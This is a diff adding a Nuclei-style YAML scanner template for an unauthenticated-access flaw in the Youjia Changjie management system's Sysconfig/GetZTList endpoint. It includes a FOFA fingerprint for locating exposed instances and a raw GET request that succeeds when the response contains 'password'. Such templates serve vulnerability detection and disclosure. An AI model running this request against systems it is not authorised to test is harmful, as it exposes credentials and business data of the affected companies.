@@ -1,0 +1,24 @@
+id: youjia-changjie-getztlist-info-leak
+
+info:
+  name: "友加畅捷管理系统 Sysconfig 接口未授权访问漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: icon_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="
+          友加畅捷管理系统为小微商贸流通企业提供财务业务一体化解决方案，包含进销存、财务核算及移动管理模块。该系统 Sysconfig/GetZTList 接口存在身份验证绕过缺陷，攻击者可绕过认证机制直接调用该接口，从而获取非公开数据。该缺陷可能暴露用户凭证、系统配置等敏感信息，导致企业数据资产面临未经授权的访问风险。
+  tags: 友加畅捷管理系统
+
+http:
+- raw:
+  - |
+    GET /Sysconfig/GetZTList HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'password'
